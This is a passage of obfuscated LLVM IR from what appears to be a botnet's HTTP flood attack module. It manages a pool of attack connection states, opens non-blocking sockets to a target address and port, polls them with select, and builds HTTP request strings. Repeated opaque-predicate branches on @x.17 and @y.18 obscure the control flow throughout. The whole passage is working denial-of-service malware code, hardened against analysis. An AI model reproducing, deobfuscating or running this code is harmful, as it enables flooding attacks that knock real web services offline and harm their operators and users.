  call void @table_unlock_val(i8 zeroext 57)
  %520 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %523, i32 0, i32 5
  %525 = getelementptr inbounds [512 x i8], [512 x i8]* %524, i32 0, i32 0
  %526 = call i8* @table_retrieve_val(i32 57, i32* null)
  %527 = call i32 @util_strcpy(i8* %525, i8* %526)
  call void @table_lock_val(i8 zeroext 57)
  %528 = load i32, i32* @x.17
  %529 = load i32, i32* @y.18
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %545

; <label>:536:                                    ; preds = %465
  call void @table_unlock_val(i8 zeroext 58)
  %537 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %538 = load i32, i32* %9, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %537, i64 %539
  %541 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %540, i32 0, i32 5
  %542 = getelementptr inbounds [512 x i8], [512 x i8]* %541, i32 0, i32 0
  %543 = call i8* @table_retrieve_val(i32 58, i32* null)
  %544 = call i32 @util_strcpy(i8* %542, i8* %543)
  call void @table_lock_val(i8 zeroext 58)
  br label %545

; <label>:545:                                    ; preds = %536, %originalBBpart252, %502, %originalBBpart248, %468, %465
  %546 = load i32, i32* @x.17
  %547 = load i32, i32* @y.18
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %545
  %554 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %555 = load i32, i32* %9, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %554, i64 %556
  %558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %557, i32 0, i32 6
  %559 = getelementptr inbounds [257 x i8], [257 x i8]* %558, i32 0, i32 0
  %560 = load i8*, i8** %17, align 8
  %561 = call i32 @util_strcpy(i8* %559, i8* %560)
  %562 = load i32, i32* @x.17
  %563 = load i32, i32* @y.18
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %570

; <label>:570:                                    ; preds = %originalBBpart256
  %571 = load i32, i32* %9, align 4
  %572 = add nsw i32 %571, 1
  store i32 %572, i32* %9, align 4
  br label %277

; <label>:573:                                    ; preds = %originalBBpart232
  %574 = load i32, i32* @x.17
  %575 = load i32, i32* @y.18
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %573
  %582 = load i32, i32* @x.17
  %583 = load i32, i32* @y.18
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %590

; <label>:590:                                    ; preds = %4236, %1520, %1494, %originalBBpart260
  %591 = load i32, i32* @x.17
  %592 = load i32, i32* @y.18
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %590
  store i32 0, i32* %23, align 4
  %599 = call i64 @time(i64* null) #6
  %600 = trunc i64 %599 to i32
  store i32 %600, i32* %27, align 4
  %601 = load i32, i32* @x.17
  %602 = load i32, i32* @y.18
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %609

; <label>:609:                                    ; preds = %originalBBpart264
  %610 = load i32, i32* @x.17
  %611 = load i32, i32* @y.18
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %609
  %618 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %619 = getelementptr inbounds [16 x i64], [16 x i64]* %618, i64 0, i64 0
  %620 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %619) #6, !srcloc !1
  %621 = extractvalue { i64, i64* } %620, 0
  %622 = extractvalue { i64, i64* } %620, 1
  %623 = trunc i64 %621 to i32
  store i32 %623, i32* %28, align 4
  %624 = ptrtoint i64* %622 to i64
  %625 = trunc i64 %624 to i32
  store i32 %625, i32* %29, align 4
  %626 = load i32, i32* @x.17
  %627 = load i32, i32* @y.18
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %634

; <label>:634:                                    ; preds = %originalBBpart268
  br label %635

; <label>:635:                                    ; preds = %634
  %636 = load i32, i32* @x.17
  %637 = load i32, i32* @y.18
  %638 = sub i32 %636, 1
  %639 = mul i32 %636, %638
  %640 = urem i32 %639, 2
  %641 = icmp eq i32 %640, 0
  %642 = icmp slt i32 %637, 10
  %643 = or i1 %641, %642
  br i1 %643, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %635
  %644 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %645 = getelementptr inbounds [16 x i64], [16 x i64]* %644, i64 0, i64 0
  %646 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %645) #6, !srcloc !2
  %647 = extractvalue { i64, i64* } %646, 0
  %648 = extractvalue { i64, i64* } %646, 1
  %649 = trunc i64 %647 to i32
  store i32 %649, i32* %30, align 4
  %650 = ptrtoint i64* %648 to i64
  %651 = trunc i64 %650 to i32
  store i32 %651, i32* %31, align 4
  %652 = load i32, i32* @x.17
  %653 = load i32, i32* @y.18
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %660

; <label>:660:                                    ; preds = %originalBBpart272
  store i32 0, i32* %9, align 4
  br label %661

; <label>:661:                                    ; preds = %originalBBpart2192, %660
  %662 = load i32, i32* %9, align 4
  %663 = load i32, i32* %18, align 4
  %664 = icmp slt i32 %662, %663
  br i1 %664, label %665, label %1475

; <label>:665:                                    ; preds = %661
  %666 = load i32, i32* @x.17
  %667 = load i32, i32* @y.18
  %668 = sub i32 %666, 1
  %669 = mul i32 %666, %668
  %670 = urem i32 %669, 2
  %671 = icmp eq i32 %670, 0
  %672 = icmp slt i32 %667, 10
  %673 = or i1 %671, %672
  br i1 %673, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %665
  %674 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %675 = load i32, i32* %9, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %674, i64 %676
  store %struct.attack_http_state* %677, %struct.attack_http_state** %26, align 8
  %678 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %679 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %678, i32 0, i32 1
  %680 = load i8, i8* %679, align 4
  %681 = zext i8 %680 to i32
  %682 = icmp eq i32 %681, 1
  %683 = load i32, i32* @x.17
  %684 = load i32, i32* @y.18
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %682, label %691, label %703

; <label>:691:                                    ; preds = %originalBBpart276
  %692 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %693 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %692, i32 0, i32 12
  %694 = load i32, i32* %693, align 4
  %695 = icmp ne i32 %694, 0
  br i1 %695, label %696, label %699

; <label>:696:                                    ; preds = %691
  %697 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %698 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %697, i32 0, i32 1
  store i8 4, i8* %698, align 4
  br label %702

; <label>:699:                                    ; preds = %691
  %700 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %701 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %700, i32 0, i32 1
  store i8 0, i8* %701, align 4
  br label %702

; <label>:702:                                    ; preds = %699, %696
  br label %703

; <label>:703:                                    ; preds = %702, %originalBBpart276
  %704 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %705 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %704, i32 0, i32 1
  %706 = load i8, i8* %705, align 4
  %707 = zext i8 %706 to i32
  %708 = icmp eq i32 %707, 0
  br i1 %708, label %709, label %837

; <label>:709:                                    ; preds = %703
  %710 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %710, i8 0, i64 16, i32 4, i1 false)
  %711 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %712 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %711, i32 0, i32 0
  %713 = load i32, i32* %712, align 4
  %714 = icmp ne i32 %713, -1
  br i1 %714, label %715, label %720

; <label>:715:                                    ; preds = %709
  %716 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %717 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %716, i32 0, i32 0
  %718 = load i32, i32* %717, align 4
  %719 = call i32 @close(i32 %718)
  br label %720

; <label>:720:                                    ; preds = %715, %709
  %721 = load i32, i32* @x.17
  %722 = load i32, i32* @y.18
  %723 = sub i32 %721, 1
  %724 = mul i32 %721, %723
  %725 = urem i32 %724, 2
  %726 = icmp eq i32 %725, 0
  %727 = icmp slt i32 %722, 10
  %728 = or i1 %726, %727
  br i1 %728, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %720
  %729 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %730 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %731 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %730, i32 0, i32 0
  store i32 %729, i32* %731, align 4
  %732 = icmp eq i32 %729, -1
  %733 = load i32, i32* @x.17
  %734 = load i32, i32* @y.18
  %735 = sub i32 %733, 1
  %736 = mul i32 %733, %735
  %737 = urem i32 %736, 2
  %738 = icmp eq i32 %737, 0
  %739 = icmp slt i32 %734, 10
  %740 = or i1 %738, %739
  br i1 %740, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %732, label %741, label %758

; <label>:741:                                    ; preds = %originalBBpart280
  %742 = load i32, i32* @x.17
  %743 = load i32, i32* @y.18
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %741
  %750 = load i32, i32* @x.17
  %751 = load i32, i32* @y.18
  %752 = sub i32 %750, 1
  %753 = mul i32 %750, %752
  %754 = urem i32 %753, 2
  %755 = icmp eq i32 %754, 0
  %756 = icmp slt i32 %751, 10
  %757 = or i1 %755, %756
  br i1 %757, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %1456

; <label>:758:                                    ; preds = %originalBBpart280
  %759 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %760 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %759, i32 0, i32 0
  %761 = load i32, i32* %760, align 4
  %762 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %763 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %762, i32 0, i32 0
  %764 = load i32, i32* %763, align 4
  %765 = call i32 (i32, i32, ...) @fcntl(i32 %764, i32 3, i32 0)
  %766 = or i32 2048, %765
  %767 = call i32 (i32, i32, ...) @fcntl(i32 %761, i32 4, i32 %766)
  store i32 65535, i32* %10, align 4
  %768 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %769 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %768, i32 0, i32 0
  %770 = load i32, i32* %769, align 4
  %771 = bitcast i32* %10 to i8*
  %772 = call i32 @setsockopt(i32 %770, i32 0, i32 8, i8* %771, i32 4) #6
  %773 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %773, align 4
  %774 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %775 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %774, i32 0, i32 4
  %776 = load i32, i32* %775, align 4
  %777 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %778 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %777, i32 0, i32 0
  store i32 %776, i32* %778, align 4
  %779 = load i16, i16* %19, align 2
  %780 = call zeroext i16 @htons(i16 zeroext %779) #7
  %781 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %780, i16* %781, align 2
  %782 = load i32, i32* %27, align 4
  %783 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %784 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %783, i32 0, i32 2
  store i32 %782, i32* %784, align 4
  %785 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %786 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %785, i32 0, i32 1
  store i8 2, i8* %786, align 4
  %787 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %788 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %787, i32 0, i32 0
  %789 = load i32, i32* %788, align 4
  %790 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %791 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %791, %struct.sockaddr** %790, align 8
  %792 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %793 = load %struct.sockaddr*, %struct.sockaddr** %792, align 8
  %794 = call i32 @connect(i32 %789, %struct.sockaddr* %793, i32 16)
  %795 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %796 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %795, i32 0, i32 0
  %797 = load i32, i32* %796, align 4
  %798 = srem i32 %797, 64
  %799 = zext i32 %798 to i64
  %800 = shl i64 1, %799
  %801 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %802 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %803 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %802, i32 0, i32 0
  %804 = load i32, i32* %803, align 4
  %805 = sdiv i32 %804, 64
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds [16 x i64], [16 x i64]* %801, i64 0, i64 %806
  %808 = load i64, i64* %807, align 8
  %809 = or i64 %808, %800
  store i64 %809, i64* %807, align 8
  %810 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %811 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %810, i32 0, i32 0
  %812 = load i32, i32* %811, align 4
  %813 = load i32, i32* %23, align 4
  %814 = icmp sgt i32 %812, %813
  br i1 %814, label %815, label %836

; <label>:815:                                    ; preds = %758
  %816 = load i32, i32* @x.17
  %817 = load i32, i32* @y.18
  %818 = sub i32 %816, 1
  %819 = mul i32 %816, %818
  %820 = urem i32 %819, 2
  %821 = icmp eq i32 %820, 0
  %822 = icmp slt i32 %817, 10
  %823 = or i1 %821, %822
  br i1 %823, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %815
  %824 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %825 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %824, i32 0, i32 0
  %826 = load i32, i32* %825, align 4
  %827 = add nsw i32 %826, 1
  store i32 %827, i32* %23, align 4
  %828 = load i32, i32* @x.17
  %829 = load i32, i32* @y.18
  %830 = sub i32 %828, 1
  %831 = mul i32 %828, %830
  %832 = urem i32 %831, 2
  %833 = icmp eq i32 %832, 0
  %834 = icmp slt i32 %829, 10
  %835 = or i1 %833, %834
  br i1 %835, label %originalBBpart297, label %originalBB86alteredBB

originalBBpart297:                                ; preds = %originalBB86
  br label %836

; <label>:836:                                    ; preds = %originalBBpart297, %758
  br label %1455

; <label>:837:                                    ; preds = %703
  %838 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %839 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %838, i32 0, i32 1
  %840 = load i8, i8* %839, align 4
  %841 = zext i8 %840 to i32
  %842 = icmp eq i32 %841, 2
  br i1 %842, label %843, label %918

; <label>:843:                                    ; preds = %837
  %844 = load i32, i32* @x.17
  %845 = load i32, i32* @y.18
  %846 = sub i32 %844, 1
  %847 = mul i32 %844, %846
  %848 = urem i32 %847, 2
  %849 = icmp eq i32 %848, 0
  %850 = icmp slt i32 %845, 10
  %851 = or i1 %849, %850
  br i1 %851, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %843
  %852 = load i32, i32* %27, align 4
  %853 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %854 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %853, i32 0, i32 2
  %855 = load i32, i32* %854, align 4
  %856 = sub i32 %852, %855
  %857 = icmp ugt i32 %856, 30
  %858 = load i32, i32* @x.17
  %859 = load i32, i32* @y.18
  %860 = sub i32 %858, 1
  %861 = mul i32 %858, %860
  %862 = urem i32 %861, 2
  %863 = icmp eq i32 %862, 0
  %864 = icmp slt i32 %859, 10
  %865 = or i1 %863, %864
  br i1 %865, label %originalBBpart2111, label %originalBB99alteredBB

originalBBpart2111:                               ; preds = %originalBB99
  br i1 %857, label %866, label %875

; <label>:866:                                    ; preds = %originalBBpart2111
  %867 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %868 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %867, i32 0, i32 1
  store i8 0, i8* %868, align 4
  %869 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %870 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %869, i32 0, i32 0
  %871 = load i32, i32* %870, align 4
  %872 = call i32 @close(i32 %871)
  %873 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %874 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %873, i32 0, i32 0
  store i32 -1, i32* %874, align 4
  br label %1456

; <label>:875:                                    ; preds = %originalBBpart2111
  %876 = load i32, i32* @x.17
  %877 = load i32, i32* @y.18
  %878 = sub i32 %876, 1
  %879 = mul i32 %876, %878
  %880 = urem i32 %879, 2
  %881 = icmp eq i32 %880, 0
  %882 = icmp slt i32 %877, 10
  %883 = or i1 %881, %882
  br i1 %883, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %875
  %884 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %885 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %884, i32 0, i32 0
  %886 = load i32, i32* %885, align 4
  %887 = srem i32 %886, 64
  %888 = zext i32 %887 to i64
  %889 = shl i64 1, %888
  %890 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %891 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %892 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %891, i32 0, i32 0
  %893 = load i32, i32* %892, align 4
  %894 = sdiv i32 %893, 64
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds [16 x i64], [16 x i64]* %890, i64 0, i64 %895
  %897 = load i64, i64* %896, align 8
  %898 = or i64 %897, %889
  store i64 %898, i64* %896, align 8
  %899 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %900 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %899, i32 0, i32 0
  %901 = load i32, i32* %900, align 4
  %902 = load i32, i32* %23, align 4
  %903 = icmp sgt i32 %901, %902
  %904 = load i32, i32* @x.17
  %905 = load i32, i32* @y.18
  %906 = sub i32 %904, 1
  %907 = mul i32 %904, %906
  %908 = urem i32 %907, 2
  %909 = icmp eq i32 %908, 0
  %910 = icmp slt i32 %905, 10
  %911 = or i1 %909, %910
  br i1 %911, label %originalBBpart2153, label %originalBB113alteredBB

originalBBpart2153:                               ; preds = %originalBB113
  br i1 %903, label %912, label %917

; <label>:912:                                    ; preds = %originalBBpart2153
  %913 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %914 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %913, i32 0, i32 0
  %915 = load i32, i32* %914, align 4
  %916 = add nsw i32 %915, 1
  store i32 %916, i32* %23, align 4
  br label %917

; <label>:917:                                    ; preds = %912, %originalBBpart2153
  br label %1454

; <label>:918:                                    ; preds = %837
  %919 = load i32, i32* @x.17
  %920 = load i32, i32* @y.18
  %921 = sub i32 %919, 1
  %922 = mul i32 %919, %921
  %923 = urem i32 %922, 2
  %924 = icmp eq i32 %923, 0
  %925 = icmp slt i32 %920, 10
  %926 = or i1 %924, %925
  br i1 %926, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %918
  %927 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %928 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %927, i32 0, i32 1
  %929 = load i8, i8* %928, align 4
  %930 = zext i8 %929 to i32
  %931 = icmp eq i32 %930, 4
  %932 = load i32, i32* @x.17
  %933 = load i32, i32* @y.18
  %934 = sub i32 %932, 1
  %935 = mul i32 %932, %934
  %936 = urem i32 %935, 2
  %937 = icmp eq i32 %936, 0
  %938 = icmp slt i32 %933, 10
  %939 = or i1 %937, %938
  br i1 %939, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br i1 %931, label %940, label %1262

; <label>:940:                                    ; preds = %originalBBpart2157
  %941 = load i32, i32* @x.17
  %942 = load i32, i32* @y.18
  %943 = sub i32 %941, 1
  %944 = mul i32 %941, %943
  %945 = urem i32 %944, 2
  %946 = icmp eq i32 %945, 0
  %947 = icmp slt i32 %942, 10
  %948 = or i1 %946, %947
  br i1 %948, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %940
  %949 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %950 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %949, i32 0, i32 14
  store i32 -1, i32* %950, align 4
  %951 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %952 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %951, i32 0, i32 11
  store i32 0, i32* %952, align 4
  %953 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %954 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %953, i32 0, i32 18
  %955 = getelementptr inbounds [1024 x i8], [1024 x i8]* %954, i32 0, i32 0
  call void @util_zero(i8* %955, i32 1024)
  %956 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %957 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %956, i32 0, i32 17
  store i32 0, i32* %957, align 4
  %958 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %958, i32 10240)
  %959 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %960 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %961 = call i32 @util_strlen(i8* %960)
  %962 = sext i32 %961 to i64
  %963 = getelementptr inbounds i8, i8* %959, i64 %962
  %964 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %965 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %964, i32 0, i32 9
  %966 = getelementptr inbounds [9 x i8], [9 x i8]* %965, i32 0, i32 0
  %967 = call i32 @util_strcpy(i8* %963, i8* %966)
  %968 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %969 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %970 = call i32 @util_strlen(i8* %969)
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds i8, i8* %968, i64 %971
  %973 = call i32 @util_strcpy(i8* %972, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %974 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %975 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %976 = call i32 @util_strlen(i8* %975)
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds i8, i8* %974, i64 %977
  %979 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %980 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %979, i32 0, i32 6
  %981 = getelementptr inbounds [257 x i8], [257 x i8]* %980, i32 0, i32 0
  %982 = call i32 @util_strcpy(i8* %978, i8* %981)
  %983 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %984 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %985 = call i32 @util_strlen(i8* %984)
  %986 = sext i32 %985 to i64
  %987 = getelementptr inbounds i8, i8* %983, i64 %986
  %988 = call i32 @util_strcpy(i8* %987, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %989 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %990 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %991 = call i32 @util_strlen(i8* %990)
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds i8, i8* %989, i64 %992
  %994 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %995 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %994, i32 0, i32 5
  %996 = getelementptr inbounds [512 x i8], [512 x i8]* %995, i32 0, i32 0
  %997 = call i32 @util_strcpy(i8* %993, i8* %996)
  %998 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %999 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1000 = call i32 @util_strlen(i8* %999)
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds i8, i8* %998, i64 %1001
  %1003 = call i32 @util_strcpy(i8* %1002, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %1004 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1005 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1006 = call i32 @util_strlen(i8* %1005)
  %1007 = sext i32 %1006 to i64
  %1008 = getelementptr inbounds i8, i8* %1004, i64 %1007
  %1009 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
